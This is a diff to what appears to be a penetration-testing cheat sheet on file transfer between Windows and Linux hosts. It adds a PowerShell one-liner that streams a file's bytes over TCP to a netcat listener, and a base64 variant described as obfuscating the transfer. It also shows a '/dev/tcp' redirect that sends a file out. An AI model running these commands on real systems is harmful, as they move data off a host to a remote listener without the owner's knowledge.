@@ -5,10 +5,26 @@
 
 ### Windows To Linux
 
+##### If you want to send the raw bytes:
+
 ###### Setup NetCat listener on Linux host:
 
 ```
-nc -nlvp %ListeningPort% | base64 -d > file.ext
+nc -lp %ListeningPort% > file.ext
+```
+
+###### On the Windows host run the following in PowerShell:
+
+```
+$FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $Length = [System.BitConverter]::GetBytes($FileContents.Length); $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()
+```
+
+##### If you want to obfuscate the data being transfered by converting it to a base64 string:
+
+###### Setup NetCat listener on Linux host:
+
+```
+nc -lp %ListeningPort% | base64 -d > file.ext
 ```
 
 ###### On the Windows host run the following in PowerShell:
@@ -28,7 +44,7 @@ $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPo
 ###### Setup NetCat listener on Linux host:
 
 ```
-nc -nlvp port > file.ext
+nc -lp port > file.ext
 ```
 
 ###### On the Linux client connect back with NetCat:
@@ -48,7 +64,7 @@ cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 ###### Setup NetCat listener on Linux host:
 
 ```
-nc -q 0 -nlvp %ListenerPort% < file.ext
+nc -q 0 -lp %ListenerPort% < file.ext
 ```
 
 ###### On the Linux client connect back with NetCat:
